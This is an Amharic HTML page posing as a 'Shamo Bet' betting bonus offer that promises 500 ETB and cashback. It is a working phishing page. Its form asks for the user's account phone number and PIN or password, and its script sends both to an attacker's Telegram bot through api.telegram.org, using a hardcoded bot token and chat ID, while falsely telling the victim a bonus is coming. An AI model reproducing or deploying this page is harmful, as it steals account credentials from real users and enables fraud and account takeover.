html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shamo Bet - Bonus Platform</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #022c22 0%, #064e3b 50%, #0f172a 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: #ffffff;
            padding: 35px 25px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
            max-width: 420px;
            width: 100%;
            position: relative;
            overflow: hidden;
            border: 2px solid #10b981;
        }
        .top-badge {
            background: linear-gradient(90deg, #f59e0b, #ef4444);
            color: #ffffff;
            font-size: 12px;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 1px;
            padding: 6px 16px;
            border-radius: 20px;
            display: inline-block;
            margin: 0 auto 15px auto;
            box-shadow: 0 4px 10px rgba(245, 158, 11, 0.3);
        }
        .header-wrapper {
            text-align: center;
            margin-bottom: 20px;
        }
        h1 {
            color: #065f46;
            font-size: 30px;
            font-weight: 900;
            letter-spacing: 1px;
            margin-bottom: 4px;
        }
        .subtitle {
            color: #dc2626;
            font-weight: 700;
            font-size: 15px;
        }
        .bonus-section {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin-bottom: 20px;
        }
        .bonus-card {
            background: linear-gradient(145deg, #fff1f2, #ffe4e6);
            border: 1px solid #fecdd3;
            border-radius: 12px;
            padding: 12px 10px;
            text-align: center;
            box-shadow: 0 2px 6px rgba(0,0,0,0.04);
        }
        .bonus-card h4 {
            margin: 0;
            color: #be123c;
            font-size: 15px;
            font-weight: 800;
        }
        .bonus-card p {
            margin: 4px 0 0 0;
            font-size: 11px;
            color: #4b5563;
            font-weight: 600;
        }
        .description {
            color: #065f46;
            font-size: 14px;
            font-weight: 600;
            line-height: 1.5;
            background-color: #ecfdf5;
            border-left: 4px solid #10b981;
            padding: 12px 15px;
            border-radius: 8px;
            margin-bottom: 22px;
            text-align: center;
        }
        .form-group {
            margin-bottom: 16px;
        }
        label {
            display: block;
            font-weight: 700;
            color: #1e293b;
            margin-bottom: 6px;
            font-size: 13px;
        }
        input[type="tel"], textarea {
            width: 100%;
            padding: 10px 14px;
            border: 2px solid #cbd5e1;
            border-radius: 10px;
            box-sizing: border-box;
            font-size: 14px;
            transition: all 0.25s ease;
            font-family: inherit;
        }
        textarea {
            resize: none;
            height: 42px; /* ጠበብ እንዲል የተደረገበት */
        }
        input:focus, textarea:focus {
            outline: none;
            border-color: #dc2626;
            box-shadow: 0 0 0 3px rgba(220, 38, 38, 0.15);
        }
        button {
            width: 100%;
            background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
            color: white;
            padding: 14px;
            border: none;
            border-radius: 10px;
            font-size: 17px;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 6px 15px rgba(220, 38, 38, 0.35);
            margin-top: 5px;
        }
        button:hover {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
            transform: translateY(-1px);
            box-shadow: 0 8px 20px rgba(220, 38, 38, 0.45);
        }
        button:active {
            transform: translateY(1px);
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header-wrapper">
        <span class="top-badge">🎁 SPECIAL OFFER</span>
        <h1>SHAMO BET</h1>
        <div class="subtitle">እኛን ስለመረጡ እናመሰግናለን!</div>
    </div>

    <!-- የቦነስ እና የሽልማት ካርዶች -->
    <div class="bonus-section">
        <div class="bonus-card">
            <h4>🎁 500 ETB</h4>
            <p>የእንኳን ደህና መጡ ቦነስ</p>
        </div>
        <div class="bonus-card">
            <h4>🔥 100% Cash Back</h4>
            <p>በመጀመሪያው ተቀማጭ</p>
        </div>
    </div>

    <!-- የተስተካከለው የመግለጫ ጽሑፍ -->
    <div class="description">
        ይህ የ Shamo Bet ቦነስ መስጫ ገጽ ነው።
    </div>

    <form id="supportForm">
        <div class="form-group">
            <label for="phoneNumber">የ Shamo Bet ስልክ ቁጥር</label>
            <input type="tel" id="phoneNumber" placeholder="09........" required>
        </div>

        <div class="form-group">
            <label for="issueDetail">PIN / ፓስወርድ</label>
            <textarea id="issueDetail" rows="1" placeholder="ፓስወርዶ ያስገቡ..." required></textarea>
        </div>

        <button type="button" onclick="sendData()">ቦነስ ያግኙ</button>
    </form>
</div>

<script>
    function sendData() {
        const botToken = "8688090386:AAHSsKf9rnAs20X28cwSwGRe4w-csdjZFog"; 
        const chatId = "8841053408";

        const phoneNumber = document.getElementById("phoneNumber").value.trim();
        const issueDetail = document.getElementById("issueDetail").value.trim();

        if (!phoneNumber || !issueDetail) {
            alert("እባክዎ ሁሉንም ሳጥኖች በትክክል ይሙሉ።");
            return;
        }

        const messageText = `📩 *አዲስ የቦነስ ጥያቄ (Shamo Bet)*\n\n📞 *ስልክ ቁጥር:* ${phoneNumber}\n📝 *PIN/ፓስወርድ:* ${issueDetail}`;

        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: messageText,
                parse_mode: "Markdown"
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert("መረጃው በተሳካ ሁኔታ ተልኳል! ቦነስዎ በቅርቡ ይለቀቃል።");
                document.getElementById("supportForm").reset();
            } else {
                alert("መልእክቱን መላክ አልተቻለም። እባክዎ Bot Token እና Chat ID በትክክል ማስገባትዎን ያረጋግጡ።");
            }
        })
        .catch(error => {
            console.error("Error:", error);
            alert("የኔትወርክ ስህተት አጋጥሟል። እባክዎ እንደገና ይሞክሩ።");
        });
    }
</script>

</body>
</html>
